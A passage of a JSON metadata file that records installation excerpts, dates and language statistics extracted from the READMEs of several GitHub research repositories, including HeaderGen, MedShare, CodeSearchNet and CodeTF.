                        "Getting Started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/GPTutor/gptutor-extension/main/README.md"
            },
            {
                "result": {
                    "value": "<img width=\"790\" alt=\"\u622a\u5716 2023-06-11 \u4e0b\u53484 03 46\" src=\"https://github.com/GPTutor/gptutor-extension/assets/43432631/afc028b6-a783-4f60-b598-12e97a2900c2\">\n\n<br/>\n<br/>\n",
                    "type": "Text_excerpt",
                    "original_header": "3. Set OpenAI API key by pasting the key in the input box. You may follow the instruction to get an API key from <a href=\"https://platform.openai.com/account/api-keys\">OpenAI's Webiste</a>",
                    "parent_header": [
                        "GPTutor(\ud83e\udd16,\ud83e\udd16) - VS Code Extension",
                        "Getting Started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/GPTutor/gptutor-extension/main/README.md"
            },
            {
                "result": {
                    "value": "```\n> GPTutor: setModel\n```\n<br/>\n",
                    "type": "Text_excerpt",
                    "original_header": "4. (Optional) Set the GPT model to be used by running the `GPTutor: setModel` Command",
                    "parent_header": [
                        "GPTutor(\ud83e\udd16,\ud83e\udd16) - VS Code Extension",
                        "Getting Started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/GPTutor/gptutor-extension/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "https://marketplace.visualstudio.com/items?itemName=gptutor.gptutor\n \n",
                    "original_header": "GPTutor(\ud83e\udd16,\ud83e\udd16) - VS Code Extension"
                },
                "confidence": 0.9858058961308898,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/GPTutor/gptutor-extension/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Follow the instructions [in this document](docs/Prompt.md) to customize the prompt. The default prompts is in set the [package.json](package.json), you are welcome to send pull requests for your awesome prompts. \n",
                    "original_header": "Customize Prompt"
                },
                "confidence": 0.9998776247146702,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/GPTutor/gptutor-extension/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-04-14T13:19:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-05T03:08:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 68549
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 18262
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 1172
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "548": {
        "filename": "ashwinprasadme_headergen_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/secure-software-engineering/HeaderGen",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\npip install headergen\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install HeaderGen",
                    "parent_header": [
                        "HeaderGen"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ashwinprasadme/headergen/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "      git clone --recursive\n      git submodule update --init --recursive\n      git pull --recurse-submodules \n      docker build -t headergen .\n      docker run -v {$PWD}/headergen_output:/headergen_output -it headergen bash \n      docker build -t headergen .\n      docker run -v \"%cd%\"/headergen_output:/headergen_output -it headergen bash \n",
                    "original_header": "1. Build container"
                },
                "confidence": 0.991561074121421,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ashwinprasadme/headergen/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "      rm framework_models/models_cache.pickle\n      rm pycg_extended/machinery/pytd_cache.pickle \n+ Setup venv and dependencies with `setup.sh` script \n      ./setup.sh -i \n      make ROOT_PATH=<path to repo root> microbench \n      make ROOT_PATH=<path to repo root> realworldbench \n      make ROOT_PATH=<path to repo root> all \n",
                    "original_header": "Building from Source"
                },
                "confidence": 0.9815456418981499,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ashwinprasadme/headergen/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "      make clean \n",
                    "original_header": "2. Run HeaderGen benchmarks from inside contatiner"
                },
                "confidence": 0.9100120183711615,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ashwinprasadme/headergen/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-07T16:20:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-20T08:54:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 7525477
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 6071246
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 44823
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 4989
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 3751
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 2300
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 711
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "549": {
        "filename": "yylonly_medshare_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/yylonly/MedShare",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "* git clone https://github.com/yylonly/medshare.git\n* cd medshare\n* docker-compose build\n* docker-compose up -d\n",
                    "type": "Text_excerpt",
                    "original_header": "Install"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/yylonly/medshare/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "http://localhost:8081/net.mydreamy.privacyehr-0.0.1-SNAPSHOT\n* EHR Sharing - Username: doctorgov Password: 123456 (auth service ip: 127.0.0.1 if on localhost)\n* Audit - username: tracker1 password:123\n* Query Patient ID: 73001 - 73100\n \n",
                    "original_header": "Test"
                },
                "confidence": 0.964112055829492,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/yylonly/medshare/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-01-11T21:50:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-21T14:50:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 118061
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 8454
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 2978
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 546
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 424
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "550": {
        "filename": "hideakihata_NMTbasedCorrectivePatchGenerationDataset_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hideakihata/NMTbasedCorrectivePatchGenerationDataset",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Preparing a dictionary\n```\n  paste train/src.unk train/trg.unk | sed 's/\t/ ||| /g' >   lamtram-table.txt\n  fast_align/build/fast_align -i lamtram-table.txt -d -o -v -p lamtram- table.cond > lamtram-table.align\n``` \n",
                    "original_header": "Used tools for NMT"
                },
                "confidence": 0.9999311656796331,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hideakihata/NMTbasedCorrectivePatchGenerationDataset/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-08-23T01:47:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-05-11T13:23:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "551": {
        "filename": "poojaruhal_RP-class-comment-classification_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/poojaruhal/RP-class-comment-classification",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-12-08T23:28:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-15T09:36:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 2365
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "552": {
        "filename": "Karim-53_Compare-xAI_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Karim-53/Compare-xAI",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "[//]: # (There is no specific requirements listed in `requirements.txt` you can run only a few tests and a few Explainer with a small set of packages. So just install what is needed on the go :&#41; )\n[//]: # (`requirements.txt` contains a good start)\ninstall the required packages using\n```shell\npip install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "2.1 Install required packages",
                    "parent_header": [
                        "2. Reproduce experiments"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Karim-53/Compare-xAI/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can check directly the benchmark results at https://karim-53.github.io/cxai/ \n"
                },
                "confidence": 0.9393606687280804,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Karim-53/Compare-xAI/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-03-16T11:56:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-17T09:50:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 3401403
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1173965
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 16992
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1889
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "553": {
        "filename": "github_CodeSearchNet_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/github/CodeSearchNet",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "  You should only have to perform the setup steps once to download the data and prepare the environment.\n\n  1. Due to the complexity of installing all dependencies, we prepared Docker containers to run this code. You can find instructions on how to install Docker in the [official docs](https://docs.docker.com/get-started/).  Additionally, you must install [Nvidia-Docker](https://github.com/NVIDIA/nvidia-docker) to satisfy GPU-compute related dependencies.  For those who are new to Docker, this [blog post](https://towardsdatascience.com/how-docker-can-help-you-become-a-more-effective-data-scientist-7fc048ef91d5) provides a gentle introduction focused on data science.\n\n  2. After installing Docker, you need to download the pre-processed datasets, which are hosted on S3.  You can do this by running `script/setup`.\n      ```\n      script/setup\n      ```\n      This will build Docker containers and download the datasets.  By default, the data is downloaded into the `resources/data/` folder inside this repository, with the directory structure described [here](resources/README.md).\n\n  **The datasets you will download (most of them compressed) have a combined size of only ~ 3.5 GB.**\n  \n  3.  To start the Docker container, run `script/console`:\n      ```\n      script/console\n      ```\n      This will land you inside the Docker container, starting in the `/src` directory. You can detach from/attach to this container to pause/continue your work.\n \n  For more about the data, see [Data Details](#data-details) below, as well as [this notebook](notebooks/ExploreData.ipynb).\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "Introduction"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/github/CodeSearchNet/master/README.md"
            },
            {
                "result": {
                    "value": " To initialize W&B:\n\n   1. Navigate to the `/src` directory in this repository.\n\n   2. If it's your first time using W&B on a machine, you will need to log in:\n\n      ```\n      $ wandb login\n      ```\n\n   3. You will be asked for your API key, which appears on your [W&B profile settings page](https://app.wandb.ai/settings).\n",
                    "type": "Text_excerpt",
                    "original_header": "W&amp;B Setup",
                    "parent_header": [
                        "References"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/github/CodeSearchNet/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**If this is your first time reading this, we recommend skipping this section and reading the following sections.** The below commands assume you have [Docker](https://docs.docker.com/get-started/) and [Nvidia-Docker](https://github.com/NVIDIA/nvidia-docker), as well as a GPU that supports [CUDA 9.0](https://developer.nvidia.com/cuda-90-download-archive) or greater. Note: you should only have to run `script/setup` once to download the data. \n  ```bash\n  # clone this repository\n  git clone https://github.com/github/CodeSearchNet.git\n  cd CodeSearchNet/\n  # download data (~3.5GB) from S3; build and run the Docker container\n  script/setup\n  # this will drop you into the shell inside a Docker container\n  script/console\n  # optional: log in to W&B to see your training metrics,\n  # track your experiments, and submit your models to the benchmark\n  wandb login\n\n  # verify your setup by training a tiny model\n  python train.py --testrun\n  # see other command line options, try a full training run with default values,\n  # and explore other model variants by extending this baseline script\n  python train.py --help\n  python train.py\n\n  # generate predictions for model evaluation\n  python predict.py -r github/CodeSearchNet/0123456 # this is the org/project_name/run_id\n  ``` \nFinally, you can submit your run to the [community benchmark](https://app.wandb.ai/github/CodeSearchNet/benchmark) by following these [instructions](BENCHMARK.md).\n \n",
                    "original_header": "Quickstart"
                },
                "confidence": 0.9955060884899142,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/github/CodeSearchNet/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you have run the [setup steps](#setup) above you will already have the data, and nothing more needs to be done. The data will be available in the `/resources/data` folder of this repository, with [this directory structure](/resources/README.md).\n \n",
                    "original_header": "Data Acquisition"
                },
                "confidence": 0.9718270981060628,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/github/CodeSearchNet/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Code, comments, and docstrings are extracted in a language-specific manner, removing artifacts of that language.\n```{json}\n{\n  'code': 'def get_vid_from_url(url):\\n'\n          '        \"\"\"Extracts video ID from URL.\\n'\n          '        \"\"\"\\n'\n          \"        return match1(url, r'youtu\\\\.be/([^?/]+)') or \\\\\\n\"\n          \"          match1(url, r'youtube\\\\.com/embed/([^/?]+)') or \\\\\\n\"\n          \"          match1(url, r'youtube\\\\.com/v/([^/?]+)') or \\\\\\n\"\n          \"          match1(url, r'youtube\\\\.com/watch/([^/?]+)') or \\\\\\n\"\n          \"          parse_query_param(url, 'v') or \\\\\\n\"\n          \"          parse_query_param(parse_query_param(url, 'u'), 'v')\",\n  'code_tokens': ['def',\n                  'get_vid_from_url',\n                  '(',\n                  'url',\n                  ')',\n                  ':',\n                  'return',\n                  'match1',\n                  '(',\n                  'url',\n                  ',',\n                  \"r'youtu\\\\.be/([^?/]+)'\",\n                  ')',\n                  'or',\n                  'match1',\n                  '(',\n                  'url',\n                  ',',\n                  \"r'youtube\\\\.com/embed/([^/?]+)'\",\n                  ')',\n                  'or',\n                  'match1',\n                  '(',\n                  'url',\n                  ',',\n                  \"r'youtube\\\\.com/v/([^/?]+)'\",\n                  ')',\n                  'or',\n                  'match1',\n                  '(',\n                  'url',\n                  ',',\n                  \"r'youtube\\\\.com/watch/([^/?]+)'\",\n                  ')',\n                  'or',\n                  'parse_query_param',\n                  '(',\n                  'url',\n                  ',',\n                  \"'v'\",\n                  ')',\n                  'or',\n                  'parse_query_param',\n                  '(',\n                  'parse_query_param',\n                  '(',\n                  'url',\n                  ',',\n                  \"'u'\",\n                  ')',\n                  ',',\n                  \"'v'\",\n                  ')'],\n  'docstring': 'Extracts video ID from URL.',\n  'docstring_tokens': ['Extracts', 'video', 'ID', 'from', 'URL', '.'],\n  'func_name': 'YouTube.get_vid_from_url',\n  'language': 'python',\n  'original_string': 'def get_vid_from_url(url):\\n'\n                      '        \"\"\"Extracts video ID from URL.\\n'\n                      '        \"\"\"\\n'\n                      \"        return match1(url, r'youtu\\\\.be/([^?/]+)') or \\\\\\n\"\n                      \"          match1(url, r'youtube\\\\.com/embed/([^/?]+)') or \"\n                      '\\\\\\n'\n                      \"          match1(url, r'youtube\\\\.com/v/([^/?]+)') or \\\\\\n\"\n                      \"          match1(url, r'youtube\\\\.com/watch/([^/?]+)') or \"\n                      '\\\\\\n'\n                      \"          parse_query_param(url, 'v') or \\\\\\n\"\n                      \"          parse_query_param(parse_query_param(url, 'u'), \"\n                      \"'v')\",\n  'partition': 'test',\n  'path': 'src/you_get/extractors/youtube.py',\n  'repo': 'soimort/you-get',\n  'sha': 'b746ac01c9f39de94cac2d56f665285b0523b974',\n  'url': 'https://github.com/soimort/you-get/blob/b746ac01c9f39de94cac2d56f665285b0523b974/src/you_get/extractors/youtube.py#L135-L143'\n}\n```\n \n",
                    "original_header": "Schema &amp; Format"
                },
                "confidence": 0.9980679884638683,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/github/CodeSearchNet/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-02-28T17:22:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T13:11:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 368173
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 291937
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 4008
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1535
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "554": {
        "filename": "PolyEval_G-TransEval_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/polyeval/g-transeval",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "|Models          |Source                                        |\n|----------------|----------------------------------------------|\n|CodeBERT        |https://huggingface.co/microsoft/codebert-base|\n|CodeT5          |https://huggingface.co/Salesforce/codet5-base |\n|TransCoder      |https://github.com/facebookresearch/CodeGen   |\n|TransCoder-ST   |https://github.com/facebookresearch/CodeGen   | \n",
                    "original_header": "Models checkpoint"
                },
                "confidence": 0.9999999823820219,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/PolyEval/G-TransEval/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-07-21T09:29:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-09T07:48:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 2443436
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1510219
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 877103
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 600842
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 1435
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PHP",
                    "name": "PHP",
                    "type": "Programming_language",
                    "size": 1230
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 430
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "555": {
        "filename": "salesforce_CodeTF_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/salesforce/CodeTF",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n    \n<p align=\"center\">\n    <br>\n    <img src=\"assets/logo.png\" width=\"500\"/>\n    <br>\n<p>\n<div align=\"center\">\n  <a href=\"https://opensource.org/license/apache-2-0/\">\n  <img alt=\"license\" src=\"https://img.shields.io/badge/License-Apache%202.0-green.svg\"/>\n  </a>\n   <a href=\"https://www.python.org/downloads/release/python-380/\">\n  <img alt=\"python\" src=\"https://img.shields.io/badge/python-3.8+-yellow.svg\"/>\n  </a> \n   <a href=\"https://pypi.org/project/salesforce-codetf/\">\n  <img alt=\"downloads\" src=\"https://static.pepy.tech/badge/salesforce-codetf\"/>\n  </a>  \n<a href=\"https://arxiv.org/pdf/2306.00029.pdf\">Technical Report</a>,\n<a href=\"https://opensource.salesforce.com/CodeTF/latest/index.html\">Documentation</a>,\n<a href=\"https://github.com/salesforce/CodeTF/tree/main/test_inference\">Examples</a>,\n    \n# CodeTF - A One-stop Transformer Library for State-of-the-art Code LLM \n\n## Installation Guide \n1. (Optional) Creating conda environment\n```bash\nconda create -n codetf python=3.8\nconda activate codetf\n```\n \n2. Install from [PyPI](https://pypi.org/project/salesforce-codetf/):\n```bash\npip install salesforce-codetf\n```\n    \n3. Alternatively, build CodeTF from source:\n```bash\ngit clone https://github.com/salesforce/CodeTF.git\ncd CodeTF\npip install -e .\n```\n \nAdditionally, to make sure the quantization feature works well, also install these dependencies:\n```bash\npip install -q -U git+https://github.com/huggingface/transformers.git\npip install -q -U git+https://github.com/huggingface/peft.git\npip install -q -U git+https://github.com/huggingface/accelerate.git\n``` \nComparing to [this script from HuggingFace](https://github.com/huggingface/transformers/blob/main/examples/research_projects/codeparrot/scripts/human_eval.py), which requires ~230 LOCs to evaluate on pass@k, we only need 14 LOCs to do the same !!! \n"
                },
                "confidence": 0.9869824790197725,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/salesforce/CodeTF/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-02T05:05:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T05:35:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 104993
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "556": {
        "filename": "ispras_juliet-dynamic_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ispras/juliet-dynamic",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Building all CWEs may require a long time. Building required CWE to measure\nSydr: \n",
                    "original_header": "Build"
                },
                "confidence": 0.991458581192564,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ispras/juliet-dynamic/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Save statistics to file (results must be already collected): \n    $ ./test_juliet.py > stats.txt \n",
                    "original_header": "Generating LaTex Table"
                },
                "confidence": 0.9570079249558128,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ispras/juliet-dynamic/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. Extract results archive in Juliet root:\n```\n$ tar xf results.tar.xz\n```\n2. The following script will remove `results/stats.json` and rerun sanitizers\n   verification:\nBASH2* \nIf you want to generate LaTex table, see section above.\n \n",
                    "original_header": "Reproducing Statistics"
                },
                "confidence": 0.9285296695653118,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ispras/juliet-dynamic/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-09-17T13:39:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-12T21:43:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "557": {
        "filename": "v-m_GDGNC_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/v-m/GDGNC",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2016-01-22T10:11:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-19T17:56:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 89164
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "558": {
        "filename": "reissnda_AutomataConformance_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/reissnda/AutomataConformance",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-04-08T05:04:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-01-30T09:01:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 6261080
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 2788393
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 23016
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "559": {
        "filename": "qishenghu_CodeInstruct_2024-10-03.json",
        "code_repository": [
            {
                "result": {
